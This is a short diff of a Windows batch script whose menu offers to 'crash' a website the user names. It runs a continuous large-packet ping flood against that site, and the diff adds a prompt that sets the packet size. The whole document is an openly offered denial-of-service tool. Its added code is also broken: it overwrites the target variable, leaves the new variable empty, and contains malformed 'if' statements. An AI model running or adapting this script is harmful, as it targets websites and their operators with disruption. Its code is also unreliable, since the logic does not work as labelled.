@@ -304,6 +304,10 @@ echo Enter the website you would like to crash
 set input=
 set /p input=Enter your Website here:
 if %input%==goto A if NOT B
+echo Enter the number of attempts
+set input-attemps=
+set /p input=Enter your Amount here:
+if %input-attemps%==goto A if NOT B
 echo Processing Your request
 ping localhost>nul
 ping localhost>nul
@@ -313,7 +317,7 @@ echo Now Crashing Website...DO NOT CLOSE THIS BOX!! PRESS CRTL + C TO END!!
 echo ----------------------------------------------------------------------
 goto website_crasher_main
 :website_crasher_main
-ping %input% -t -l 1000
+ping %input% -t -l %input-attemps%
 
 
 
